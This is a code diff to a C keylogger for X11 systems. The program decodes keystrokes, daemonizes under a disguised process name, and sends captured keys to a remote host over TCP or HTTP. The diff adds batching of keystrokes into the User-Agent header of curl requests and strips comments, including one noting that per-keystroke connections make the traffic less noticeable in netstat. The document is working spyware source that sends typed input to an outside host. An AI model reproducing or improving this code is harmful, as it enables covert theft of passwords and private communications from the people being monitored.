@@ -15,6 +15,9 @@
  *     logged multiple times (this would depend on the repeat delay and
  *     speed of X keyboard settings); although this is not (yet) implemented,
  *     it won't have much impact on "regular" logs.
+ *   - HTTP logging: on exit, make sure that the last remaining keystrokes
+ *     in buffer are being sent before exiting. 
+ *   - HTTP loggin: support POST requests
  * */
 
 #include <stdio.h>
@@ -107,10 +110,6 @@ int main (int argc, char ** argv) {
 	}
 }
 
-/**
- * Initialization stuff: parse arguments, define signal handlers, define
- * output stream, set default options. Returns time when init() finished.
- * */
 struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	int c, i, j;
 	time_t rawtime;
@@ -240,10 +239,6 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	return localtime(&rawtime);
 }
 
-/**
- * checks keycodes and mods, and returns a human-readable interpretation of the
- * keyboard status.
- * */
 char* decodeKey(int code, int down, int mod) {
 	static char *str, keystroke_readable[MAX_KEYLEN + 1];
 	int i = 0, remapChar = 0;
@@ -286,9 +281,6 @@ char* decodeKey(int code, int down, int mod) {
 	return keystroke_readable;
 }
 
-/**
- * Read the mod key(s) of the keymap state and return the present mods
- * */
 int getMods(char *kbd) {
 	int i;
 	KeyCode kc;
@@ -310,19 +302,11 @@ int getMods(char *kbd) {
 	return 0;
 }
 
-/**
- * Retrieve one specific bit (idx) of a keymap vector
- * */
 int getbit(char *kbd, int idx) {
 	return kbd[idx/8] & (1<<(idx%8));
 }
 
 
-/**
- * Signal handler for SIGTERM, SIGINT and SIGHUP. Only set global flags, which
- * are regularly checked in main loop; this prevents us from requiring the
- * main configuration structure on global scope.
- * */
 void signal_handler(int sig) {
 	switch(sig) {
 	  case(SIGINT):
@@ -337,9 +321,6 @@ void signal_handler(int sig) {
 	}
 }
 
-/**
- * Clean up and exit program: Close open file descriptors and free memory.
- * */
 void clean_exit(struct config_struct* cfg){
 	if(cfg->logfd != stdout)
 		fclose(cfg->logfd);
@@ -355,22 +336,12 @@ void clean_exit(struct config_struct* cfg){
 }
 
 
-/**
- * fatal: Print error message and abort execution.
- * */
 void fatal(const char * msg){
 	if(msg != NULL)
 		log(0, stderr, "Fatal: %s.\n", msg);
 	exit(EXIT_FAILURE);
 }
 
-/**
- * Transmit keystroke to a remote host, where some daemon is required to listen
- * at the given port. The TCP connection is newly established upon every call
- * to this function; this is inefficient, but also offers advantages (e.g.,
- * chances are lower that the user will see a constant TCP stream in netstat
- * output, etc). Returns the number of bytes read, or negative value on error.
- * */
 int transmit_keystroke_inet(char* key, struct config_struct *opts){
 	int sock, bytes_sent;
 	struct hostent *host;
@@ -399,13 +370,18 @@ int transmit_keystroke_inet(char* key, struct config_struct *opts){
 
 
 #ifdef _HAVE_CURL
-/**
- * Transmits
- * */
 int transmit_keystroke_http(char* key, struct config_struct *cfg){
 	CURL* curl;
-	char *http_header_field = "User-Agent: ";
-	char *buffer;
+	char *http_header_field = HTTP_HEADER_FIELD;
+	char *http_header;
+	static char keystroke_buffer[KEYSTROKE_BUFFER_SIZE + 1]; //+null byte
+
+	if(strlen(keystroke_buffer) + strlen(key) <= (KEYSTROKE_BUFFER_SIZE)) {
+		strcat(keystroke_buffer, key);
+		return 2;
+	}
+
+	log(2, cfg->logfd, "HTTP buffer queue full, sending to webserver.");
 
 	curl = curl_easy_init();
 	if(!curl)
@@ -413,9 +389,11 @@ int transmit_keystroke_http(char* key, struct config_struct *cfg){
 
 	/* create http header-line with keystroke in it */
 	struct curl_slist *headers = NULL;
-	buffer = alloca(sizeof(char) * (strlen(http_header_field) + strlen(key) +1));
-	sprintf(buffer, "%s%s", http_header_field, key);
-	headers = curl_slist_append(headers, buffer);
+	http_header = alloca(sizeof(char) *
+		(strlen(http_header_field) + KEYSTROKE_BUFFER_SIZE +1));
+
+	sprintf(http_header, "%s%s", http_header_field, keystroke_buffer);
+	headers = curl_slist_append(headers, http_header);
 
 	/* build http request and send */
 	curl_easy_setopt(curl, CURLOPT_URL, cfg->host );
@@ -425,13 +403,13 @@ int transmit_keystroke_http(char* key, struct config_struct *cfg){
 		return 0;
 
 	curl_easy_cleanup(curl);
+
+	keystroke_buffer[0] = 0;
+	strcat(keystroke_buffer, key);
 	return 1;
 }
 #endif //_HAVE_CURL
 
-/**
- * printf() wrapper, taking care of debug levels
- * */
 void log(int level, FILE* stream, const char *fmt, ...) {
 	va_list args;
 	va_start(args, fmt);
@@ -443,11 +421,6 @@ void log(int level, FILE* stream, const char *fmt, ...) {
 }
 
 
-/**
- * Daemonize logger. If a process_name is given, the name of the newly created
- * child as it appears within the process table, is altered. Returns pid of
- * child process, or exits on error.
- * */
 int daemonize(char* child_process_name){
 	pid_t pid, sid;
 	
@@ -480,9 +453,6 @@ int daemonize(char* child_process_name){
 	return pid;
 }
 
-/**
- * Secure malloc
- * */
 void* smalloc(size_t size) {
 	void* ptr;
 	
